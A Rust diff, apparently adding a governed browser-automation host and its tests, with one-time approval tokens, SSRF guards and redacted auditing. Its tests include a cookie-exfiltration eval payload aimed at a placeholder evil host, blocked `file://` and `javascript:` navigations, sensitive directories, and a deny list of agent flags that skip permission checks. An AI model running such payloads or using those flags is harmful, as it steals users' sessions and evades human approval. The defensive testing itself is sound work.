+// ── Lane-C governed CDP browser host — the real driver src/browser.ts injects ──
+//
+// A webview cannot open a raw TCP/WebSocket to a browser's DevTools endpoint;
+// only the host can. So the CDP driver lives here: `browser_connect` opens one
+// page-target WebSocket, `browser_dispatch` drives navigate/read/interact/eval
+// through the SAME fail-closed gate as every other side effect, and
+// `browser_disconnect` tears it down. The security shape mirrors `governed_command`
+// / `pty_spawn`:
+//   * The non-http(s) navigation HARD-DENY is re-checked host-side BEFORE the token
+//     is spent (createTauriGovernance delegates request() to the Rust classify, so
+//     the TS isSafeHttpUrl never runs in prod — this is the real enforcement).
+//   * navigate/read/interact/eval each spend a one-time token bound EXACTLY as
+//     browserActionToGate minted it (navigate binds the url; the others bind no
+//     extra fields — the raw selector/value/js are NOT part of governance).
+//   * The audit line carries only the op (+ navigate url); the raw typed value (a
+//     possible password) and eval JS (arbitrary code) NEVER reach the ledger.
+
+/// Serde mirror of src/browser.ts `BrowserAction` (a tagged union on `op`). The
+/// raw `selector`/`value`/`js` fields reach the CDP DRIVER only — they never enter
+/// the governance detail or the audit ledger (the gate sees a length/preview via
+/// browserActionToGate; the driver spends the raw text separately).
+#[derive(Deserialize)]
+#[serde(rename_all = "camelCase")]
+struct BrowserActionInput {
+    op: String,
+    #[serde(default)]
+    url: Option<String>, // navigate
+    #[serde(default)]
+    what: Option<String>, // read: screenshot | dom | url
+    #[serde(default)]
+    kind: Option<String>, // interact: click | type | scroll | select
+    #[serde(default)]
+    selector: Option<String>, // interact
+    #[serde(default)]
+    value: Option<String>, // interact (RAW — driver only)
+    #[serde(default)]
+    js: Option<String>, // eval (RAW — driver only)
+}
+
+/// Mirror of src/browser.ts `BrowserResult` (camelCase → the webview reads it
+/// directly). `value` is the op's payload (navigate: final URL · read: data-uri /
+/// DOM / URL · interact: `{ok}` · eval: the JSON-able result).
+#[derive(Serialize)]
+#[serde(rename_all = "camelCase")]
+struct BrowserResult {
+    ok: bool,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    value: Option<serde_json::Value>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    error: Option<String>,
+}
+
+/// The host-owned CDP session (at most one active connection). ALL of {connection,
+/// in-flight marker, pending-disconnect request} live behind ONE Mutex, and that
+/// Mutex is NEVER held across an await: `browser_dispatch` takes the connection OUT
+/// (marking in-flight), drives it async, then re-locks to put it back. Keeping the
+/// three fields under one lock makes the emergency-disconnect race-free — whichever
+/// of {disconnect, dispatch-finish} locks second sees the other's committed state
+/// (an atomics-only design would race: disconnect could flag a session that a just-
+/// completed dispatch had already put back, wrongly dropping the NEXT one).
+#[derive(Default)]
+struct BrowserSession {
+    conn: Option<browser::CdpConnection>,
+    /// A dispatch currently holds `conn` OUT (so `conn` is None but a session lives).
+    in_flight: bool,
+    /// disconnect() was called while a dispatch was in-flight — honour it when the
+    /// dispatch finishes (drop the connection, never revive the closed session).
+    disconnect_requested: bool,
+}
+
+#[derive(Default)]
+struct BrowserHostState(Mutex<BrowserSession>);
+
+/// What an explicit disconnect did — the caller audits accordingly.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+enum DisconnectOutcome {
+    /// A connected session was dropped immediately.
+    Dropped,
+    /// A dispatch is in-flight; the drop is deferred to its completion (emergency
+    /// stop is HONOURED, not silently no-op'd).
+    DeferredInFlight,
+    /// Nothing was connected — a genuine no-op.
+    Nothing,
+}
+
+/// Pure decision for `request_disconnect` from the observable session state. Split
+/// out so the P2-3 emergency-stop invariant is unit-testable without a live
+/// CdpConnection. A present connection is dropped immediately; otherwise an
+/// in-flight dispatch defers the drop; otherwise it is a genuine no-op.
+fn disconnect_decision(conn_present: bool, in_flight: bool) -> DisconnectOutcome {
+    if conn_present {
+        DisconnectOutcome::Dropped
+    } else if in_flight {
+        DisconnectOutcome::DeferredInFlight
+    } else {
+        DisconnectOutcome::Nothing
+    }
+}
+
+/// Pure decision for `end_dispatch`: `(put_back, honored)`. A disconnect requested
+/// while the dispatch held the connection out ALWAYS wins — the connection is not
+/// put back (the closed session must never revive), regardless of `keep`. Also
+/// unit-testable without a live CdpConnection.
+fn end_dispatch_decision(keep: bool, disconnect_requested: bool) -> (bool, bool) {
+    let honored = disconnect_requested;
+    let put_back = keep && !honored;
+    (put_back, honored)
+}
+
+impl BrowserHostState {
+    /// Take the connection OUT for a dispatch, marking it in-flight. `Ok(None)` when
+    /// no session is connected (the caller errors without burning a token). Brief
+    /// lock — never held across the async drive.
+    fn begin_dispatch(&self) -> Result<Option<browser::CdpConnection>, String> {
+        let mut s = self.0.lock().map_err(|_| "browser state poisoned")?;
+        match s.conn.take() {
+            Some(c) => {
+                s.in_flight = true;
+                Ok(Some(c))
+            }
+            None => Ok(None),
+        }
+    }
+
+    /// Release the connection at the end of a dispatch. `keep` = the session is still
+    /// usable (put it back) vs dead (drop it — e.g. a transport failure). A
+    /// disconnect requested WHILE this dispatch held the connection out WINS: the
+    /// connection is dropped (never revived) regardless of `keep`. Returns true iff a
+    /// pending disconnect was honoured, so the caller can audit it. On a poisoned
+    /// lock the connection is dropped and the session ends — fail-closed.
+    fn end_dispatch(&self, conn: browser::CdpConnection, keep: bool) -> bool {
+        match self.0.lock() {
+            Ok(mut s) => {
+                s.in_flight = false;
+                let requested = std::mem::take(&mut s.disconnect_requested);
+                let (put_back, honored) = end_dispatch_decision(keep, requested);
+                if put_back {
+                    s.conn = Some(conn);
+                }
+                // else → `conn` is dropped here (session ended / not revived)
+                honored
+            }
+            Err(_) => false, // poisoned → conn dropped, session stays None (fail-closed)
+        }
+    }
+
+    /// Explicit disconnect. Drops a connected session immediately; if a dispatch is
+    /// in-flight, records the request so `end_dispatch` drops the connection on
+    /// completion (the closed session must NOT revive). Never sets the flag when
+    /// nothing is connected — otherwise it would wrongly drop the NEXT dispatch's
+    /// fresh connection.
+    fn request_disconnect(&self) -> DisconnectOutcome {
+        match self.0.lock() {
+            Ok(mut s) => {
+                let outcome = disconnect_decision(s.conn.is_some(), s.in_flight);
+                match outcome {
+                    DisconnectOutcome::Dropped => {
+                        s.conn = None;
+                    }
+                    DisconnectOutcome::DeferredInFlight => {
+                        s.disconnect_requested = true;
+                    }
+                    DisconnectOutcome::Nothing => {}
+                }
+                outcome
+            }
+            Err(_) => DisconnectOutcome::Nothing,
+        }
+    }
+
+    /// Store a freshly-opened connection (browser_connect). Clears any stale
+    /// disconnect request so a new session isn't torn down by an old emergency stop.
+    fn set_connection(&self, conn: browser::CdpConnection) -> Result<(), String> {
+        let mut s = self.0.lock().map_err(|_| "browser state poisoned")?;
+        s.conn = Some(conn);
+        s.disconnect_requested = false;
+        Ok(())
+    }
+}
+
+/// op → governance ActionKind (mirror of src/browser.ts OP_KIND / opToKind).
+fn browser_op_to_kind(op: &str) -> Option<&'static str> {
+    match op {
+        "navigate" => Some("browser.navigate"),
+        "read" => Some("browser.read"),
+        "interact" => Some("browser.interact"),
+        "eval" => Some("browser.eval"),
+        _ => None,
+    }
+}
+
+/// The REDACTED audit summary for a browser action — op-scoped, carrying the
+/// navigate URL (audit_append's `redact` scrubs any secret-shaped token) but NEVER
+/// the raw typed value (a possible password) or eval JS (arbitrary code): a
+/// length / selector is the most it reveals. Mirrors browserActionToGate's redacted
+/// summary contract.
+fn browser_audit_summary(action: &BrowserActionInput) -> String {
+    match action.op.as_str() {
+        "navigate" => format!("browser navigate {}", action.url.as_deref().unwrap_or("")),
+        "read" => format!("browser read ({})", action.what.as_deref().unwrap_or("dom")),
+        "interact" => {
+            let ik = action.kind.as_deref().unwrap_or("");
+            let sel = action.selector.as_deref().unwrap_or("");
+            if ik == "type" {
+                // A typed value may be a password — show its LENGTH, never the text.
+                let n = action.value.as_deref().map(|v| v.chars().count()).unwrap_or(0);
+                format!("browser type {n} chars into {sel}")
+            } else {
+                format!("browser {ik} {sel}")
+            }
+        }
+        // eval JS is arbitrary code — length only, never the source.
+        "eval" => {
+            let n = action.js.as_deref().map(|s| s.chars().count()).unwrap_or(0);
+            format!("browser eval JS ({n} chars)")
+        }
+        _ => "browser action".to_string(),
+    }
+}
+
+/// Route an already-gated action to the CDP driver. Returns the op's value on a
+/// page-level result (Ok) or a transport/protocol failure (Err — the caller drops
+/// the session). The RAW selector/value/js are used HERE and never audited.
+async fn browser_drive(
+    conn: &mut browser::CdpConnection,
+    kind: &str,
+    action: &BrowserActionInput,
+) -> Result<serde_json::Value, String> {
+    match kind {
+        "browser.navigate" => {
+            let url = action.url.as_deref().ok_or("navigate requires a url")?;
+            Ok(serde_json::Value::String(conn.navigate(url).await?))
+        }
+        "browser.read" => match action.what.as_deref().unwrap_or("dom") {
+            "screenshot" => Ok(serde_json::Value::String(conn.screenshot().await?)),
+            "url" => Ok(serde_json::Value::String(conn.current_url().await?)),
+            _ => Ok(serde_json::Value::String(conn.dom().await?)), // "dom" default
+        },
+        "browser.interact" => {
+            let ikind = action.kind.as_deref().ok_or("interact requires a kind")?;
+            let selector = action.selector.as_deref().ok_or("interact requires a selector")?;
+            conn.interact(ikind, selector, action.value.as_deref()).await
+        }
+        "browser.eval" => {
+            let js = action.js.as_deref().ok_or("eval requires js")?;
+            conn.eval(js).await
+        }
+        _ => Err(format!("unhandled browser kind: {kind}")),
+    }
+}
+
+/// Discover a page target's WebSocket debugger URL from a loopback DevTools HTTP
+/// endpoint. Read-only discovery (loopback only) — NOT gated, like `mcp_list_tools`.
+#[tauri::command]
+async fn browser_discover(port: u16) -> Result<String, String> {
+    browser::discover_ws_endpoint(port).await
+}
+
+/// Open the single CDP page-target connection. Not per-se gated (per-action gates
+/// cover every side effect), but AUDITED, and restricted to a LOOPBACK ws(s)
+/// endpoint so a compromised webview can't point the host at `ws://169.254.169.254`
+/// (cloud metadata) or a LAN browser — symmetric with discovery's loopback pin.
+#[tauri::command]
+async fn browser_connect(
+    app: AppHandle,
+    gov: State<'_, Governance>,
+    state: State<'_, BrowserHostState>,
+    cdp_url: String,
+    ts: Option<u64>,
+) -> Result<(), String> {
+    let ts = ts.unwrap_or(0);
+    let url = cdp_url.trim();
+    let audit_deny = |reason: &str| {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "browser.connect", "-", "denied", reason, ts);
+        }
+    };
+    let lower = url.to_ascii_lowercase();
+    if !(lower.starts_with("ws://") || lower.starts_with("wss://")) {
+        audit_deny("non-ws CDP endpoint blocked");
+        return Err("CDP endpoint must be a ws:// or wss:// URL".into());
+    }
+    // P2-2 SSRF / loopback-escape guard — the endpoint host must be loopback.
+    if !browser::is_loopback_ws_host(url) {
+        audit_deny("non-loopback CDP host blocked");
+        return Err("CDP endpoint host must be loopback (127.0.0.1 / ::1 / localhost)".into());
+    }
+    // Connect BEFORE taking the state lock (never hold a lock across an await).
+    let conn = browser::CdpConnection::connect(url).await?;
+    state.set_connection(conn)?;
+    // P3-3: record the (redacted) endpoint host so a connect leaves an SSRF trail.
+    let host = browser::ws_host(url).unwrap_or_default();
+    if let Ok(mut gate) = gov.0.lock() {
+        audit_append(&app, &mut gate, "browser.connect", "-", "success", &format!("browser connected to {host}"), ts);
+    }
+    Ok(())
+}
+
+/// Drop the active CDP connection (dropping the socket closes it). Safe direction —
+/// no approval needed. If a dispatch is in-flight (the connection is held OUT), the
+/// drop is DEFERRED to that dispatch's completion so the closed session can't
+/// revive — an emergency stop is honoured, never a silent no-op. Audited in every
+/// case except a genuine nothing-connected no-op.
+#[tauri::command]
+fn browser_disconnect(app: AppHandle, gov: State<'_, Governance>, state: State<'_, BrowserHostState>, ts: Option<u64>) -> Result<(), String> {
+    let ts = ts.unwrap_or(0);
+    let summary = match state.request_disconnect() {
+        DisconnectOutcome::Dropped => Some("browser disconnected"),
+        DisconnectOutcome::DeferredInFlight => Some("disconnect requested during in-flight action"),
+        DisconnectOutcome::Nothing => None, // nothing connected — no-op, nothing to audit
+    };
+    if let Some(summary) = summary {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "browser.connect", "-", "success", summary, ts);
+        }
+    }
+    Ok(())
+}
+
+/// THE GOVERNED CDP DISPATCH. Spends a one-time `browser.*` token BEFORE the driver
+/// touches the page — a webview cannot forge a host token, so no action runs without
+/// passing the gate. Order is security-critical (mirrors pty_spawn): the non-http(s)
+/// hard-deny is checked BEFORE the token is spent, and a missing connection / bad
+/// token never leaks a session or burns a token.
+#[tauri::command]
+async fn browser_dispatch(
+    app: AppHandle,
+    gov: State<'_, Governance>,
+    state: State<'_, BrowserHostState>,
+    token: String,
+    action: BrowserActionInput,
+    ts: Option<u64>,
+) -> Result<BrowserResult, String> {
+    let ts = ts.unwrap_or(0);
+
+    let kind = match browser_op_to_kind(action.op.trim()) {
+        Some(k) => k,
+        None => {
+            if let Ok(mut gate) = gov.0.lock() {
+                audit_append(&app, &mut gate, "browser.dispatch", "-", "error", "unknown browser op", ts);
+            }
+            return Err(format!("unknown browser op: {}", action.op));
+        }
+    };
+
+    // Shared audit helper (best-effort — an audit miss must never crash a decision).
+    let audit_browser = |outcome: &str, summary: &str| {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, kind, "-", outcome, summary, ts);
+        }
+    };
+    // Audit an in-flight disconnect that was honoured on this dispatch's completion.
+    let audit_disconnect_honored = || {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "browser.connect", "-", "success", "disconnect honored after in-flight action", ts);
+        }
+    };
+
+    // ── HOST-side HARD-DENY — before the token is spent ──
+    // navigate off http/https would pivot the agent off the web into the local
+    // machine / the browser's internals. LOAD-BEARING: prod request() delegates to
+    // the Rust classify, so the TS isSafeHttpUrl never runs there — this is the real
+    // gate (the pty dangerous-flag lesson). A policy deny NEVER touches the token.
+    if kind == "browser.navigate" && !browser::is_safe_http_url(action.url.as_deref()) {
+        audit_browser("denied", "non-http(s) navigation blocked");
+        return Err("non-http(s) navigation blocked".into());
+    }
+
+    // Take the connection OUT (marking in-flight) — a missing connection must NOT
+    // burn the token, and begin_dispatch takes NOTHING out on that path.
+    let mut conn = match state.begin_dispatch()? {
+        Some(c) => c,
+        None => return Err("no active browser connection (call browser_connect first)".into()),
+    };
+
+    // Spend the one-time token, bound EXACTLY as browserActionToGate minted it:
+    // navigate binds the url; eval binds the js; interact binds kind+selector+value;
+    // read binds no extra fields. Binding to js/value closes the "one approval →
+    // arbitrary code/target" gap (an eval('X') approval can't be spent on eval('Y')).
+    let detail = match kind {
+        "browser.navigate" => ActionDetail { url: action.url.clone(), ..Default::default() },
+        "browser.eval" => ActionDetail { js: action.js.clone(), ..Default::default() },
+        "browser.interact" => ActionDetail {
+            interact_kind: action.kind.clone(),
+            selector: action.selector.clone(),
+            value: action.value.clone(),
+            ..Default::default()
+        },
+        _ => ActionDetail::default(),
+    };
+    let binding = detail.binding(kind);
+    let consumed = match gov.0.lock() {
+        Ok(mut gate) => {
+            if try_consume_token(&mut gate, &token, kind, &binding) {
+                true
+            } else {
+                audit_append(&app, &mut gate, kind, "-", "replay-rejected", kind, ts);
+                false
+            }
+        }
+        // gov lock poisoned — the session is fine and the action never ran; put the
+        // connection back (fail-closed, no leak) rather than dropping it.
+        Err(_) => {
+            if state.end_dispatch(conn, true) {
+                audit_disconnect_honored();
+            }
+            return Err("gate poisoned".into());
+        }
+    };
+    if !consumed {
+        // A bad token must not drop a live session — put the connection back (unless
+        // a disconnect was requested while it was held out, which wins).
+        if state.end_dispatch(conn, true) {
+            audit_disconnect_honored();
+        }
+        return Err("invalid or already-spent token".into());
+    }
+
+    // consumed audit — op-scoped, REDACTED, never the raw value/js.
+    audit_browser("consumed", &browser_audit_summary(&action));
+
+    // Drive the page. A transport/protocol failure (Err) invalidates the session →
+    // the connection is DROPPED (forcing a reconnect); a page-level result (Ok) —
+    // including a driver `{ok:false, error}` — keeps the session alive → put it back
+    // (unless an in-flight disconnect was requested, which drops it either way).
+    match browser_drive(&mut conn, kind, &action).await {
+        Ok(value) => {
+            // P3-2: a navigate that LANDED off http(s) (a redirect to file:/chrome:/…)
+            // is a policy escape — drop the session + report failure. Chrome blocks
+            // cross-scheme redirects, but this is defense-in-depth at the host.
+            if kind == "browser.navigate" {
+                let landed_ok = value.as_str().map(|u| browser::is_safe_http_url(Some(u))).unwrap_or(false);
+                if !landed_ok {
+                    let honored = state.end_dispatch(conn, false); // dead session — drop
+                    audit_browser("error", "navigate redirected off http(s)");
+                    if honored {
+                        audit_disconnect_honored();
+                    }
+                    return Ok(BrowserResult { ok: false, value: None, error: Some("navigation redirected off http(s)".into()) });
+                }
+            }
+            let honored = state.end_dispatch(conn, true);
+            audit_browser("success", &browser_audit_summary(&action));
+            if honored {
+                audit_disconnect_honored();
+            }
+            Ok(BrowserResult { ok: true, value: Some(value), error: None })
+        }
+        Err(e) => {
+            let honored = state.end_dispatch(conn, false); // transport failure — drop
+            audit_browser("error", "browser action failed");
+            if honored {
+                audit_disconnect_honored();
+            }
+            Ok(BrowserResult { ok: false, value: None, error: Some(e) })
+        }
+    }
 }
 
 // ── MCP client — stdio JSON-RPC 2.0, spawned + framed HERE in the host ─────────
@@ -2086,6 +3125,336 @@ mod governance_tests {
         assert!(text.contains("fs"));
         assert!(!text.contains("harmless"));
     }
+
+    // ── R6 host-runtime: url/args are bound (previously silently dropped) ──
+
+    #[test]
+    fn binding_includes_url_so_navigate_token_is_url_bound() {
+        let bank = ActionDetail { url: Some("https://bank.com".into()), ..Default::default() };
+        let evil = ActionDetail { url: Some("https://evil.com".into()), ..Default::default() };
+        // A token approved for bank.com can't be spent to reach evil.com.
+        assert_ne!(bank.binding("browser.navigate"), evil.binding("browser.navigate"));
+        assert_eq!(bank.binding("browser.navigate"), bank.binding("browser.navigate"));
+        // And a url-bearing detail differs from the url-less one (the field the
+        // host used to drop on deserialize, leaving the binding url-blind).
+        assert_ne!(bank.binding("browser.navigate"), ActionDetail::default().binding("browser.navigate"));
+    }
+
+    #[test]
+    fn binding_includes_args_so_pty_token_is_flag_bound() {
+        let cont = ActionDetail { vendor: Some("claude".into()), args: Some(vec!["--continue".into()]), ..Default::default() };
+        let resume = ActionDetail { vendor: Some("claude".into()), args: Some(vec!["--resume".into()]), ..Default::default() };
+        assert_ne!(cont.binding("pty.spawn"), resume.binding("pty.spawn"));
+        let no_args = ActionDetail { vendor: Some("claude".into()), ..Default::default() };
+        assert_ne!(cont.binding("pty.spawn"), no_args.binding("pty.spawn"));
+    }
+
+    // ── R6 Lane-B real-PTY host: classify + the args-bound token guard ──
+
+    #[test]
+    fn classify_pty_spawn_is_known_require_approval() {
+        // pty.spawn must be an EXPLICIT known side-effecting kind, not fall through
+        // to the unknown/fail-closed branch (it still requires approval either way,
+        // but the reason must reflect that we reasoned about it).
+        let (decision, reason) = classify("pty.spawn", &[], None);
+        assert_eq!(decision, "require-approval");
+        assert_eq!(reason, "side-effecting action");
+        assert_ne!(reason, "unknown action (fail-closed)");
+    }
+
+    #[test]
+    fn pty_empty_args_binds_like_no_args() {
+        // The host normalizes Some([]) → None before rebuilding the binding, so an
+        // empty-args spawn consumes a token minted for a no-arg (args-omitted)
+        // session — matching ptySpawnToGate, which omits empty args from the gate.
+        let no_args = ActionDetail { vendor: Some("claude".into()), cwd: Some("/Users/me/p".into()), ..Default::default() };
+        let empty_norm = ActionDetail {
+            vendor: Some("claude".into()),
+            cwd: Some("/Users/me/p".into()),
+            args: pty::normalize_pty_args(Some(vec![])),
+            ..Default::default()
+        };
+        assert_eq!(no_args.binding("pty.spawn"), empty_norm.binding("pty.spawn"));
+    }
+
+    #[test]
+    fn pty_no_arg_token_cannot_open_an_args_full_session() {
+        // Mint a token for a NO-ARG claude session (args omitted → null in binding).
+        let no_args = ActionDetail { vendor: Some("claude".into()), cwd: Some("/Users/me/p".into()), ..Default::default() };
+        let binding = no_args.binding("pty.spawn");
+        let mut gate = GateState::default();
+        seed_token(&mut gate, "tok-pty", "pty.spawn", &binding);
+
+        // An args-FULL spawn (`claude --continue`) must NOT consume it — different
+        // binding (confused-deputy on args is refused). The token stays intact.
+        let args_full = ActionDetail {
+            vendor: Some("claude".into()),
+            cwd: Some("/Users/me/p".into()),
+            args: Some(vec!["--continue".into()]),
+            ..Default::default()
+        };
+        assert!(!try_consume_token(&mut gate, "tok-pty", "pty.spawn", &args_full.binding("pty.spawn")));
+
+        // The exact no-arg binding still consumes it — once (one-time).
+        assert!(try_consume_token(&mut gate, "tok-pty", "pty.spawn", &binding));
+        assert!(!try_consume_token(&mut gate, "tok-pty", "pty.spawn", &binding));
+    }
+
+    #[test]
+    fn has_dangerous_pty_flag_matches_ts_denylist_byte_for_byte() {
+        // Every arg the TS DANGEROUS_PTY_FLAGS regexes flag (incl. the `=`-adjacent
+        // form and the optional-hyphen `--allowed-?tools`), case-insensitively and
+        // after trim. Kept in lockstep with governance.ts.
+        for danger in [
+            "--dangerously-skip-permissions",
+            "--dangerously-skip",
+            "--dangerouslyanything",
+            "--DANGEROUSLY-skip", // case-insensitive
+            "--mcp-config",
+            "--mcp-config=evil.json", // = boundary
+            "--mcp-config-x",         // - boundary
+            "--mcp-server",
+            "--mcp-server=x",
+            "--permission-mode",
+            "--permission-mode=bypassPermissions",
+            "--allowed-tools",
+            "--allowedtools", // optional hyphen
+            "--allowed-tools=Bash",
+            "--yolo",
+            "--yolo=1",
+            " --YOLO ",        // trimmed + case-folded
+            "\u{feff}--yolo",  // BOM-prefixed (JS .trim strips U+FEFF too)
+        ] {
+            assert!(
+                has_dangerous_pty_flag(&[danger.to_string()]).is_some(),
+                "must flag {danger:?}"
+            );
+        }
+        // Clean flags that must NOT be flagged — the `\b` must not over-match.
+        for clean in [
+            "--continue",
+            "--resume",
+            "--model",
+            "sonnet",
+            "--mcp",                 // not a full flag
+            "--mcp-configuration",   // word char after "config" → no boundary
+            "--allowed",             // no "tools"
+            "--allowed-toolset",     // word char after "tools"
+            "--permission",          // no "-mode"
+            "--yoloxyz",             // word char after "yolo"
+        ] {
+            assert!(
+                has_dangerous_pty_flag(&[clean.to_string()]).is_none(),
+                "must NOT flag {clean:?}"
+            );
+        }
+        // A dangerous flag anywhere in the arg list is caught.
+        assert!(has_dangerous_pty_flag(&["--continue".into(), "--yolo".into()]).is_some());
+    }
+
+    #[test]
+    fn classify_pty_spawn_hard_denies_dangerous_flag_and_sensitive_cwd() {
+        // For pty.spawn the caller passes ARGS as argv and CWD as path (see
+        // request_action) — a dangerous flag or a system/secrets cwd is a DENY,
+        // never even surfaced to the native approval dialog.
+        assert_eq!(
+            classify("pty.spawn", &["--mcp-config=evil.json".to_string()], Some("/Users/me/p")).0,
+            "deny"
+        );
+        assert_eq!(classify("pty.spawn", &[], Some("/Users/me/.ssh")).0, "deny");
+        assert_eq!(classify("pty.spawn", &[], Some("/etc")).0, "deny");
+        // A clean, non-sensitive session still requires approval (not auto-allow).
+        let (d, r) = classify("pty.spawn", &["--continue".to_string()], Some("/Users/me/proj"));
+        assert_eq!(d, "require-approval");
+        assert_eq!(r, "side-effecting action");
+    }
+
+    #[test]
+    fn dialog_text_shows_url_and_args_not_the_summary() {
+        let nav = ActionDetail {
+            summary: Some("benign".into()),
+            url: Some("https://evil.example/login".into()),
+            ..Default::default()
+        };
+        let t = nav.enforced_dialog_text("browser.navigate");
+        assert!(t.contains("URL:"), "dialog must surface the URL line");
+        assert!(t.contains("evil.example"), "dialog must show the real destination");
+        assert!(!t.contains("benign"), "dialog must NOT show the webview summary");
+
+        let pty = ActionDetail {
+            summary: Some("open a shell".into()),
+            vendor: Some("claude".into()),
+            args: Some(vec!["--dangerously-skip".into()]),
+            ..Default::default()
+        };
+        let t2 = pty.enforced_dialog_text("pty.spawn");
+        assert!(t2.contains("Args:"), "dialog must surface the Args line");
+        assert!(t2.contains("--dangerously-skip"), "dialog must show the real flags");
+    }
+
+    // ── R6 Lane-C browser host: classify + the url-bound token / hard-deny ──
+
+    #[test]
+    fn classify_browser_navigate_denies_non_http() {
+        // request_action passes the navigate URL as `path`. Non-http(s) schemes are
+        // a hard DENY (never surfaced to the native dialog) — the host mirror of
+        // governance.ts's browser.navigate hard-deny, the SOLE classifier a prod
+        // navigate sees (createTauriGovernance delegates request() to Rust classify).
+        assert_eq!(classify("browser.navigate", &[], Some("file:///etc/passwd")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("javascript:alert(1)")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("data:text/html,x")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("chrome://settings")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("about:blank")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], None).0, "deny"); // no url → fail-closed
+        // An http/https navigation is NOT denied — it requires approval.
+        let (d, r) = classify("browser.navigate", &[], Some("https://example.com"));
+        assert_eq!(d, "require-approval");
+        assert_eq!(r, "side-effecting action");
+    }
+
+    #[test]
+    fn classify_browser_read_interact_eval_are_known_require_approval() {
+        // Even a read observes a possibly-authenticated remote page — all default to
+        // require-approval, and must report as a REASONED-ABOUT side-effecting kind
+        // (parity with governance.ts, where isActionKind recognises them), never the
+        // "unknown action (fail-closed)" branch.
+        for kind in ["browser.read", "browser.interact", "browser.eval"] {
+            let (d, r) = classify(kind, &[], None);
+            assert_eq!(d, "require-approval", "{kind}");
+            assert_eq!(r, "side-effecting action", "{kind}");
+            assert_ne!(r, "unknown action (fail-closed)", "{kind}");
+        }
+    }
+
+    #[test]
+    fn browser_navigate_token_is_url_bound() {
+        // navigate binds its EXACT url (a bank.com approval can't drive evil.com).
+        let bank = ActionDetail { url: Some("https://bank.com".into()), ..Default::default() };
+        let evil = ActionDetail { url: Some("https://evil.com".into()), ..Default::default() };
+        assert_ne!(bank.binding("browser.navigate"), evil.binding("browser.navigate"));
+
+        let mut gate = GateState::default();
+        seed_token(&mut gate, "tok-nav", "browser.navigate", &bank.binding("browser.navigate"));
+        assert!(!try_consume_token(&mut gate, "tok-nav", "browser.navigate", &evil.binding("browser.navigate")));
+        assert!(try_consume_token(&mut gate, "tok-nav", "browser.navigate", &bank.binding("browser.navigate")));
+    }
+
+    #[test]
+    fn browser_eval_token_is_js_bound() {
+        // P2-1: a browser.eval approval is bound to its EXACT JS — so an approval for
+        // `1+1` can't be spent to run `location.href='https://evil/'+document.cookie`
+        // (the old design let ONE eval approval run arbitrary JS, bypassing url-bind).
+        let benign = ActionDetail { js: Some("1+1".into()), ..Default::default() };
+        let evil = ActionDetail { js: Some("location.href='https://evil/'+document.cookie".into()), ..Default::default() };
+        assert_ne!(benign.binding("browser.eval"), evil.binding("browser.eval"));
+
+        let mut gate = GateState::default();
+        seed_token(&mut gate, "tok-eval", "browser.eval", &benign.binding("browser.eval"));
+        assert!(!try_consume_token(&mut gate, "tok-eval", "browser.eval", &evil.binding("browser.eval")));
+        assert!(try_consume_token(&mut gate, "tok-eval", "browser.eval", &benign.binding("browser.eval")));
+    }
+
+    #[test]
+    fn browser_interact_token_is_kind_selector_value_bound() {
+        // P2-1: a browser.interact approval is bound to kind+selector+value — so an
+        // approval to click #ok can't be swapped to click #confirm-delete, nor a
+        // typed value swapped after approval.
+        let base = ActionDetail {
+            interact_kind: Some("type".into()),
+            selector: Some("#search".into()),
+            value: Some("cats".into()),
+            ..Default::default()
+        };
+        let diff_selector = ActionDetail { selector: Some("#password".into()), ..base.clone() };
+        let diff_value = ActionDetail { value: Some("dogs".into()), ..base.clone() };
+        let diff_kind = ActionDetail { interact_kind: Some("click".into()), ..base.clone() };
+        assert_ne!(base.binding("browser.interact"), diff_selector.binding("browser.interact"));
+        assert_ne!(base.binding("browser.interact"), diff_value.binding("browser.interact"));
+        assert_ne!(base.binding("browser.interact"), diff_kind.binding("browser.interact"));
+
+        // read still binds no extra fields (bare kind).
+        assert_eq!(ActionDetail::default().binding("browser.read"), ActionDetail::default().binding("browser.read"));
+    }
+
+    #[test]
+    fn browser_dialog_shows_the_exact_js_and_interact_not_a_blind_action() {
+        // P2-1 consent gap: the native dialog must show WHAT eval/interact will run,
+        // not a bare "Action: browser.eval". (Ledger privacy is a SEPARATE surface —
+        // see browser_audit_summary_never_leaks_*.)
+        let evaled = ActionDetail { js: Some("location.href='https://evil/'+document.cookie".into()), ..Default::default() };
+        let te = evaled.enforced_dialog_text("browser.eval");
+        assert!(te.contains("JS:"), "the dialog must surface a JS line");
+        assert!(te.contains("document.cookie"), "the dialog must show the real code: {te}");
+
+        let typed = ActionDetail {
+            interact_kind: Some("type".into()),
+            selector: Some("#password".into()),
+            value: Some("hunter2".into()),
+            ..Default::default()
+        };
+        let ti = typed.enforced_dialog_text("browser.interact");
+        assert!(ti.contains("Interact: type #password"), "dialog shows kind+selector: {ti}");
+        assert!(ti.contains("hunter2"), "dialog shows the exact typed value (ephemeral consent): {ti}");
+    }
+
+    // ── P2-3: disconnect during an in-flight dispatch must not silently no-op, and
+    //          the closed session must NOT revive when the dispatch finishes ──
+
+    #[test]
+    fn disconnect_decision_defers_only_when_in_flight() {
+        // A present connection is dropped immediately.
+        assert_eq!(disconnect_decision(true, false), DisconnectOutcome::Dropped);
+        // No connection but a dispatch is in-flight → DEFER (emergency stop honoured,
+        // not a silent no-op).
+        assert_eq!(disconnect_decision(false, true), DisconnectOutcome::DeferredInFlight);
+        // Nothing connected, nothing in-flight → genuine no-op (must NOT set a flag
+        // that would drop the NEXT dispatch's fresh connection).
+        assert_eq!(disconnect_decision(false, false), DisconnectOutcome::Nothing);
+    }
+
+    #[test]
+    fn end_dispatch_honors_a_deferred_disconnect_over_keep() {
+        // Normal completion, no disconnect → put the (usable) connection back.
+        assert_eq!(end_dispatch_decision(true, false), (true, false));
+        // A disconnect requested WHILE in-flight WINS: do NOT put the connection back
+        // (the closed session must not revive), and report it as honoured.
